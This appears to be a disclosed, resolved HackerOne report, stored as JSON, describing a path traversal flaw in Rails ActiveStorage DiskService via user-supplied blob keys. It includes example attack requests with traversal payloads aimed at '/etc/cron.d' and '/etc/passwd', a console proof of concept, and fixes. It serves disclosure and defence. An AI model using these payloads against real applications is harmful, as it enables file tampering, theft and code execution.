@@ -1,0 +1,124 @@
+{
+  "id": 3580511,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTgwNTEx",
+  "url": "https://hackerone.com/reports/3580511",
+  "title": "ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-03-02T07:38:27.656Z",
+  "submitted_at": "2026-03-02T07:38:27.891Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ksw9722",
+    "url": "/ksw9722",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-05-07T14:04:44.714Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-04-07T14:04:38.552Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection\n\n## Summary\n\nActiveStorage's `DiskService#path_for` does not validate or sanitize blob keys before constructing file paths. Combined with the Hash attachable interface — which passes user-supplied `key:` values directly to `Blob.build_after_unfurling` without filtering — an attacker who can influence the Hash passed to `.attach()` can achieve **arbitrary file write, read, and delete** on the server's filesystem.\n\nThe `key:` parameter is a [documented feature](https://guides.rubyonrails.org/active_storage_overview.html#attaching-file-io-objects) intended for S3 folder organization, making it likely that developers will incorporate user input into key construction.\n\n**Severity**: High (CVSS 8.1 estimated — depends on application-level exposure)\n**Affected component**: `activestorage` (DiskService)\n**Affected versions**: All current Rails versions using ActiveStorage with DiskService\n\n---\n\n## Vulnerability Details\n\n### 1. Hash Attachable Splats All Keys Without Filtering\n\n`activestorage/lib/active_storage/attached/changes/create_one.rb:82-88`:\n\n```ruby\nwhen Hash\n  ActiveStorage::Blob.build_after_unfurling(\n    **attachable.reverse_merge(\n      record: record,\n      service_name: attachment_service_name\n    ).symbolize_keys\n  )\n```\n\nWhen a Hash is passed to `.attach()`, **every key-value pair** — including `key:` — is forwarded to `Blob.build_after_unfurling` via `**` splat.\n\n### 2. `build_after_unfurling` Accepts and Stores Arbitrary Keys\n\n`activestorage/app/models/active_storage/blob.rb:86-89`:\n\n```ruby\ndef build_after_unfurling(key: nil, io:, filename:, content_type: nil, metadata: nil, service_name: nil, identify: true, record: nil)\n  new(key: key, filename: filename, content_type: content_type, metadata: metadata, service_name: service_name).tap do |blob|\n    blob.unfurl(io, identify: identify)\n  end\nend\n```\n\nA non-nil `key:` value is passed directly to `ActiveStorage::Blob.new`.\n\n### 3. `has_secure_token` Does Not Overwrite Pre-Set Keys\n\n`activerecord/lib/active_record/secure_token.rb:73-77`:\n\n```ruby\nset_callback on, on == :initialize ? :after : :before do\n  if new_record? && !query_attribute(attribute)\n    send(\"#{attribute}=\", generate_token.call)\n  end\nend\n```\n\nThe `has_secure_token :key` callback on `ActiveStorage::Blob` only generates a secure random key when the attribute is **blank**. If a key is already set via the constructor, the callback is a no-op. The custom `key` getter (`blob.rb:176-179`) also preserves existing values via `self[:key] ||= ...`.\n\n### 4. `DiskService#path_for` Has No Path Traversal Protection\n\n`activestorage/lib/active_storage/service/disk_service.rb:101-103, 155-157`:\n\n```ruby\ndef path_for(key)\n  File.join root, folder_for(key), key\nend\n\ndef folder_for(key)\n  [ key[0..1], key[2..3] ].join(\"/\")\nend\n```\n\n`File.join` does not sanitize `../` sequences. There is no validation that the resolved path remains within `root`. A key like `../../etc/cron.d/evil` produces a path that escapes the storage directory.\n\n### 5. No Key Format Validation on the Blob Model\n\n`ActiveStorage::Blob` has **zero validation** on the `key` attribute:\n\n```ruby\nvalidates :service_name, presence: true\nvalidates :checksum, presence: true, unless: :composed\n# No validates :key, format: ...\n```\n\nThe only constraint is the database-level `NOT NULL` and `UNIQUE` index, neither of which prevent path traversal characters.\n\n---\n\n## Attack Chain\n\n```\nAttacker-controlled input\n    ↓\nHash passed to model.file.attach({ ..., key: \"../../malicious\" })\n    ↓\ncreate_one.rb: **splat passes key: to build_after_unfurling\n    ↓\nblob.rb: Blob.new(key: \"../../malicious\", ...) — key stored as-is\n    ↓\nsecure_token.rb: callback sees key is present, skips generation\n    ↓\ndisk_service.rb: path_for(\"../../malicious\")\n    → File.join(root, folder_for(key), key)\n    → escapes storage root directory\n    ↓\nupload/download/delete operates on arbitrary filesystem path\n```\n\n---\n\n## Exploitation Scenarios\n\n### Scenario A: JSON API with User-Specified Storage Path\n\nThe official Rails guide documents using `key:` for S3 folder organization. A developer building an API may extend this pattern to allow user-specified paths:\n\n```ruby\nclass Api::V1::DocumentsController < ApiController\n  def create\n    file = decode_base64_upload(params[:file_data])\n\n    @project.documents.attach(\n      io: file,\n      filename: params[:filename],\n      content_type: params[:content_type],\n      key: \"projects/#{@project.id}/#{params[:path]}\"  # user input in key\n    )\n\n    render json: { status: \"uploaded\" }\n  end\nend\n```\n\n**Attack request:**\n\n```http\nPOST /api/v1/documents HTTP/1.1\nContent-Type: application/json\n\n{\n  \"file_data\": \"KiBldmlsIGNyb250YWIgZW50cnkK\",\n  \"filename\": \"notes.txt\",\n  \"content_type\": \"text/plain\",\n  \"path\": \"../../../../etc/cron.d/backdoor\"\n}\n```\n\n**Result:** The uploaded content is written to `/etc/cron.d/backdoor` (if the process has permissions), achieving **Remote Code Execution** via cron.\n\n### Scenario B: Hash Attachable with Unsanitized Params\n\nA developer permits the `key` parameter through Strong Parameters, following the guide's documented feature:\n\n```ruby\nclass AssetsController < ApplicationController\n  def create\n    current_user.avatar.attach(avatar_params.merge(io: params[:file].tempfile))\n  end\n\n  private\n\n  def avatar_params\n    params.require(:avatar).permit(:filename, :content_type, :key)\n  end\nend\n```\n\n**Attack request:**\n\n```http\nPOST /assets HTTP/1.1\nContent-Type: multipart/form-data\n\navatar[filename]=photo.jpg\navatar[content_type]=image/jpeg\navatar[key]=../../../../../../tmp/malicious_payload\nfile=@payload.jpg\n```\n\n**Result:** Arbitrary file write to `/tmp/malicious_payload`.\n\n### Scenario C: Nested Attributes / Model Assignment\n\nWhen `has_one_attached` generates an attribute setter, Hash values flow through the vulnerable path:\n\n```ruby\nclass User < ApplicationRecord\n  has_one_attached :avatar\nend\n\nclass UsersController < ApplicationController\n  def update\n    @user.update!(user_params)\n  end\n\n  private\n\n  def user_params\n    params.require(:user).permit(:name, avatar: {})  # permissive Hash permit\n  end\nend\n```\n\nA JSON request body like `{ \"user\": { \"avatar\": { \"io\": ..., \"filename\": \"x.jpg\", \"key\": \"../../sensitive\" } } }` would inject the key through the model assignment path.\n\n### Scenario D: Arbitrary File Read via Download\n\nOnce a blob with a malicious key is persisted, any subsequent `blob.download` call reads from the traversed path:\n\n```ruby\n# After malicious blob is saved with key: \"../../etc/passwd\"\nblob = ActiveStorage::Blob.find(malicious_blob_id)\ncontent = blob.download  # reads /etc/passwd via DiskService\n```\n\nIf the application exposes blob content through any controller (the default `BlobsController`, custom download endpoints, etc.), the attacker can read arbitrary files.\n\n### Scenario E: Arbitrary File Delete via Purge\n\n```ruby\n# Blob with key: \"../../important_app_config.yml\"\nblob.purge  # calls service.delete(key) → File.delete(path_for(key))\n```\n\nDeleting the blob (via purge, or automatic cleanup of unattached blobs) deletes the traversed file path.\n\n---\n\n\n## Proof of Concept\n\nMinimal reproduction in a Rails console with DiskService configured:\n\n```ruby\n# 1. Demonstrate that a malicious key bypasses has_secure_token\nblob = ActiveStorage::Blob.build_after_unfurling(\n  key: \"../../traversal_test\",\n  io: StringIO.new(\"pwned\"),\n  filename: \"test.txt\"\n)\nputs blob.key  # => \"../../traversal_test\" (not a secure random token)\n\n# 2. Demonstrate path_for escapes root\nservice = ActiveStorage::Blob.service  # DiskService instance\nputs service.path_for(\"../../traversal_test\")\n# => \"/rails/storage/../../tr/../../traversal_test\"\n# Resolves to a path outside /rails/storage/\n\n# 3. Demonstrate via attach (simulating application code)\nuser = User.new(name: \"test\")\nuser.avatar.attach(\n  io: StringIO.new(\"arbitrary content\"),\n  filename: \"innocent.txt\",\n  key: \"../../tmp/activestorage_poc_#{SecureRandom.hex(4)}\"\n)\nuser.save!\n\n# Verify file was written outside storage root\npoc_key = user.avatar.blob.key\nresolved = File.expand_path(service.path_for(poc_key))\nstorage_root = File.expand_path(service.root)\nputs \"Key: #{poc_key}\"\nputs \"Resolved path: #{resolved}\"\nputs \"Escaped root?: #{!resolved.start_with?(storage_root)}\"  # => true\n```\n\n---\n\n## Suggested Remediation\n\n### Option A: Validate Key Format on the Blob Model (Recommended)\n\nAdd a validation that rejects keys containing path traversal characters:\n\n```ruby\n# activestorage/app/models/active_storage/blob.rb\nvalidates :key, format: {\n  with: /\\A[a-zA-Z0-9\\-_]+\\z/,\n  message: \"contains invalid characters\"\n}\n```\n\n### Option B: Sanitize in DiskService#path_for\n\nVerify the resolved path stays within the root directory:\n\n```ruby\n# activestorage/lib/active_storage/service/disk_service.rb\ndef path_for(key)\n  path = File.join(root, folder_for(key), key)\n  full_path = File.expand_path(path)\n  raise ArgumentError, \"key escapes storage root\" unless full_path.start_with?(File.expand_path(root))\n  full_path\nend\n```\n\n### Option C: Strip key from Hash Attachable\n\nPrevent the `key:` parameter from being accepted through the Hash attachable path:\n\n```ruby\n# activestorage/lib/active_storage/attached/changes/create_one.rb\nwhen Hash\n  ActiveStorage::Blob.build_after_unfurling(\n    **attachable.except(:key, \"key\").reverse_merge(\n      record: record,\n      service_name: attachment_service_name\n    ).symbolize_keys\n  )\n```\n\nA combination of Options A and B provides defense-in-depth.\n\n---\n\n## References\n\n- `activestorage/lib/active_storage/service/disk_service.rb:101-103` — `path_for` (no sanitization)\n- `activestorage/lib/active_storage/attached/changes/create_one.rb:82-88` — Hash splat\n- `activestorage/app/models/active_storage/blob.rb:86-89` — `build_after_unfurling` accepts `key:`\n- `activerecord/lib/active_record/secure_token.rb:73-77` — conditional token generation\n- [Rails Guide: Attaching File/IO Objects](https://guides.rubyonrails.org/active_storage_overview.html#attaching-file-io-objects) — documents `key:` parameter usage\n\n## Impact\n\n## Impact\n\n| Operation | DiskService Method | Primitive |\n|---|---|---|\n| `upload` | `IO.copy_stream(io, make_path_for(key))` | **Arbitrary file write** + directory creation via `mkdir_p` |\n| `download` | `File.binread path_for(key)` | **Arbitrary file read** |\n| `delete` | `File.delete path_for(key)` | **Arbitrary file delete** |\n| `delete_prefixed` | `Dir.glob(path_for(\"#{prefix}*\"))` + `rm_rf` | **Glob-based mass delete** |\n| `exist?` | `File.exist? path_for(key)` | **File existence oracle** |\n\nWith arbitrary file write, an attacker can achieve **Remote Code Execution** by writing to:\n- Cron directories (`/etc/cron.d/`)\n- SSH authorized keys (`~/.ssh/authorized_keys`)\n- Application initializers or configuration files\n- Puma/Unicorn restart-watched files\n\n### Who Is Affected\n\n- Applications using **DiskService** (default in development; used in production for small/single-server deployments and on-premises environments)\n- Applications where **any user input flows into the Hash passed to `.attach()`**, particularly the `key:` field\n- The official guide's documented `key:` pattern encourages developers to construct keys from dynamic values, increasing the likelihood of user input reaching this code path",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-05-07T14:04:39.147Z",
+  "allow_singular_disclosure_after": -3264.812825701,
+  "singular_disclosure_allowed": true,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "medium",
+    "score": 6.5,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 160,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
